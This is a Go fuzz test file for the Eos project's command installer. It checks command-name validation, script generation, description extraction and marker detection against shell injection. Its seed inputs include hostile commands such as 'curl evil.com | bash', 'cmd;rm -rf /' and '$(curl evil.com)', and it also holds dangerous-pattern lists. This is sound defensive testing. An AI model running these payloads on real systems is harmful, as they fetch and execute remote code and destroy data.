package command

import (
	"os"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/testutil"
)

// FuzzValidateCommandNameSecurity tests command name validation against injection attacks
func FuzzValidateCommandNameSecurity(f *testing.F) {
	// Seed with various command name scenarios including security issues
	f.Add("ls")
	f.Add("my_command")
	f.Add("")
	f.Add("cmd;rm -rf /")
	f.Add("cmd&&curl evil.com")
	f.Add("cmd||wget malware")
	f.Add("cmd$(rm -rf /)")
	f.Add("cmd`curl evil.com`")
	f.Add("cmd with spaces")
	f.Add("cmd'injection'")
	f.Add("cmd\"injection\"")
	f.Add("cmd<redirection>")
	f.Add("cmd|pipe")
	f.Add("cmd&background")
	f.Add("cmd\\escape")
	f.Add("cmd*glob")
	f.Add("cmd?wildcard")
	f.Add("cmd~tilde")
	f.Add("cmd()subshell")
	f.Add("cmd{}brace")
	f.Add("cmd[]bracket")
	f.Add("normal-command-123")
	f.Add("cmd\x00null")
	f.Add("cmd\nnewline")
	f.Add("cmd\ttab")

	f.Fuzz(func(t *testing.T, name string) {
		rc := testutil.TestRuntimeContext(t)
		ci := NewCommandInstaller(rc)

		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("validateCommandName panicked with name=%q: %v", name, r)
			}
		}()

		err := ci.validateCommandName(name)

		// Check for patterns that are currently validated
		currentlyValidatedPatterns := []string{
			";", "&", "|", "<", ">", "(", ")", "{", "}", "[", "]",
			"\\", "\"", "'", "*", "?", "~", " ",
		}

		// Security issues not currently caught (SECURITY FINDING!)
		securityGaps := []string{"\x00", "\n", "\t", "\r"}

		containsValidated := false
		for _, pattern := range currentlyValidatedPatterns {
			if strings.Contains(name, pattern) {
				containsValidated = true
				break
			}
		}

		containsSecurityGap := false
		for _, pattern := range securityGaps {
			if strings.Contains(name, pattern) {
				containsSecurityGap = true
				t.Logf("SECURITY FINDING: Command name validation does not catch dangerous character: %q in name: %q", pattern, name)
				break
			}
		}

		// Empty names should always be invalid
		if name == "" {
			if err == nil {
				t.Errorf("Empty command name should be invalid")
			}
			return
		}

		// Names with currently validated dangerous patterns should be invalid
		if containsValidated {
			if err == nil {
				t.Errorf("Command name with dangerous patterns should be invalid: %q", name)
			}
		} else if !containsSecurityGap {
			// Safe names should be valid (unless they have security gaps)
			if err != nil {
				t.Logf("Safe command name rejected (may be intentional): %q, error: %v", name, err)
			}
		}
	})
}

// FuzzValidateDefinition tests CommandDefinition validation
func FuzzValidateDefinition(f *testing.F) {
	// Seed with various command definition scenarios
	f.Add("ls", "ls -la", "List files")
	f.Add("", "", "")
	f.Add("cmd;injection", "rm -rf /", "Dangerous command")
	f.Add("safe-cmd", "", "No content")
	f.Add("cmd with spaces", "echo hello", "Invalid name")
	f.Add("valid_cmd", "curl evil.com | bash", "Malicious content")
	f.Add("test", "echo $USER", "Safe content")
	f.Add("cmd\\escape", "echo 'test'", "Escape in name")
	f.Add("cmd\"quote", "echo \"hello\"", "Quote in name")
	f.Add("cmd'quote", "echo 'hello'", "Single quote in name")

	f.Fuzz(func(t *testing.T, name, content, description string) {
		rc := testutil.TestRuntimeContext(t)
		ci := NewCommandInstaller(rc)

		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("ValidateDefinition panicked with name=%q: %v", name, r)
			}
		}()

		def := &CommandDefinition{
			Name:        name,
			Content:     content,
			Description: description,
			TargetDir:   "/tmp/test",
			Executable:  true,
		}

		err := ci.ValidateDefinition(def)

		// Empty name should always be invalid
		if name == "" {
			if err == nil {
				t.Errorf("Empty command name should be invalid")
			}
			return
		}

		// Empty content should always be invalid
		if content == "" {
			if err == nil {
				t.Errorf("Empty command content should be invalid")
			}
			return
		}

		// Check for shell metacharacters in name
		if strings.ContainsAny(name, ";&|<>(){}[]\\\"'*?~") {
			if err == nil {
				t.Errorf("Command name with shell metacharacters should be invalid: %q", name)
			}
		}

		// Log potentially dangerous content for security analysis
		dangerousContentPatterns := []string{
			"rm -rf", "curl", "wget", "bash", "sh -c", "eval", "exec",
			"$(", "`", ";", "&&", "||", ">/dev/null", "2>&1",
		}

		for _, pattern := range dangerousContentPatterns {
			if strings.Contains(strings.ToLower(content), pattern) {
				t.Logf("Potentially dangerous content pattern '%s' detected in: %q", pattern, content)
			}
		}
	})
}

// FuzzGenerateScript tests script generation for injection vulnerabilities
func FuzzGenerateScript(f *testing.F) {
	// Seed with various script scenarios
	f.Add("ls", "ls -la", "List files")
	f.Add("test", "echo hello", "")
	f.Add("malicious", "curl evil.com | bash", "Malicious script")
	f.Add("inject", "echo $USER; rm -rf /", "Command injection")
	f.Add("cmd", "echo 'safe'; echo \"safe2\"", "Mixed quotes")
	f.Add("test", "echo `whoami`", "Command substitution")
	f.Add("cmd", "echo $(id)", "Command substitution alt")
	f.Add("test", "echo test\nrm -rf /", "Newline injection")
	f.Add("cmd", "echo 'test' && curl evil.com", "Command chaining")
	f.Add("script", "/bin/bash -c 'malicious code'", "Nested shell")

	f.Fuzz(func(t *testing.T, name, content, description string) {
		rc := testutil.TestRuntimeContext(t)
		ci := NewCommandInstaller(rc)

		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("GenerateScript panicked with name=%q: %v", name, r)
			}
		}()

		def := &CommandDefinition{
			Name:        name,
			Content:     content,
			Description: description,
			TargetDir:   "/tmp/test",
			Executable:  true,
		}

		script := ci.GenerateScript(def)

		// Verify script starts with shebang
		if !strings.HasPrefix(script, "#!/bin/bash") {
			t.Errorf("Generated script should start with shebang")
		}

		// Verify script contains the content
		if content != "" && !strings.Contains(script, content) {
			t.Errorf("Generated script should contain the command content")
		}

		// Verify script has Eos marker
		if !strings.Contains(script, "Generated by Eos command installer") {
			t.Errorf("Generated script should contain Eos marker")
		}

		// Check for potential script injection vulnerabilities
		if strings.Contains(script, "\n#!/") && script != "#!/bin/bash\n" {
			t.Logf("Potential shebang injection detected in script")
		}

		// Check for dangerous patterns that might have been injected
		dangerousPatterns := []string{
			"\n\ncurl", "\n\nwget", "\n\nrm -rf", "\n\nformat",
			"\n\ndel /", "\n\nbash -c", "\n\nsh -c",
		}

		for _, pattern := range dangerousPatterns {
			if strings.Contains(strings.ToLower(script), pattern) {
				t.Logf("Potentially dangerous pattern '%s' detected in generated script", pattern)
			}
		}
	})
}

// FuzzExtractDescription tests description extraction from script files
func FuzzExtractDescription(f *testing.F) {
	// Seed with various script content scenarios
	f.Add("#!/bin/bash\n# This is a test script\necho hello")
	f.Add("#!/bin/bash\n# Description: Test command\necho test")
	f.Add("#!/bin/bash\n# Generated by Eos\n# Command: test\necho hello")
	f.Add("#!/bin/bash\necho hello")
	f.Add("")
	f.Add("#!/bin/bash\n# Malicious comment\n# Description: $(curl evil.com)\necho test")
	f.Add("#!/bin/bash\n# Multiple\n# Comments\n# Description: Real description\necho test")
	f.Add("#!/bin/bash\n# \n# Empty comment\necho test")
	f.Add("#!/bin/bash\n#No space comment\necho test")
	f.Add("#!/bin/bash\n# Comment with\nnewline injection\necho test")

	f.Fuzz(func(t *testing.T, content string) {
		rc := testutil.TestRuntimeContext(t)
		ci := NewCommandInstaller(rc)

		// Create a temporary file for testing
		tmpFile, err := createTempScriptFile(content)
		if err != nil {
			t.Skipf("Could not create temp file: %v", err)
		}
		defer removeTempFile(tmpFile)

		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("extractDescription panicked with content=%q: %v", content, r)
			}
		}()

		description, err := ci.extractDescription(tmpFile)

		// If no error, verify description is reasonable
		if err == nil {
			// Check for injection patterns in extracted description
			if strings.Contains(description, "$(") ||
				strings.Contains(description, "`") ||
				strings.Contains(description, "curl") ||
				strings.Contains(description, "wget") {
				t.Logf("Potentially dangerous content in extracted description: %q", description)
			}

			// Check for newline injection
			if strings.Contains(description, "\n") || strings.Contains(description, "\r") {
				t.Logf("Newline characters in extracted description: %q", description)
			}
		}
	})
}

// FuzzIsEosCommand tests Eos command detection
func FuzzIsEosCommand(f *testing.F) {
	// Seed with various script scenarios
	f.Add("#!/bin/bash\n# Generated by Eos command installer\necho hello")
	f.Add("#!/bin/bash\necho hello")
	f.Add("")
	f.Add("#!/bin/bash\n# Fake: Generated by Eos command installer\nmalicious code")
	f.Add("#!/bin/bash\n# Not generated by Eos\necho test")
	f.Add("# Generated by Eos command installer")
	f.Add("#!/bin/bash\n# Generated by Eos command installer\necho test") // Different case
	f.Add("#!/bin/bash\n# This was Generated by Eos command installer today\necho test")
	f.Add("#!/bin/bash\n" + strings.Repeat("# comment\n", 20) + "# Generated by Eos command installer\necho test")

	f.Fuzz(func(t *testing.T, content string) {
		rc := testutil.TestRuntimeContext(t)
		ci := NewCommandInstaller(rc)

		// Create a temporary file for testing
		tmpFile, err := createTempScriptFile(content)
		if err != nil {
			t.Skipf("Could not create temp file: %v", err)
		}
		defer removeTempFile(tmpFile)

		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("isEosCommand panicked with content=%q: %v", content, r)
			}
		}()

		isEos := ci.isEosCommand(tmpFile)

		// Verify detection logic
		expectedEos := strings.Contains(content, "Generated by Eos command installer")

		if isEos != expectedEos {
			t.Logf("Detection mismatch: got %v, expected %v for content: %q", isEos, expectedEos, content)
		}

		// Check for potential bypass attempts
		if strings.Contains(content, "Generated by") &&
			strings.Contains(content, "Eos") &&
			strings.Contains(content, "command") &&
			!strings.Contains(content, "Generated by Eos command installer") {
			t.Logf("Potential Eos detection bypass attempt: %q", content)
		}
	})
}

// Helper functions for testing

func createTempScriptFile(content string) (string, error) {
	tmpFile, err := os.CreateTemp("", "fuzz-test-*")
	if err != nil {
		return "", err
	}

	_, err = tmpFile.WriteString(content)
	if err != nil {
		_ = tmpFile.Close()
		_ = os.Remove(tmpFile.Name())
		return "", err
	}

	_ = tmpFile.Close()
	return tmpFile.Name(), nil
}

func removeTempFile(path string) {
	_ = os.Remove(path)
}
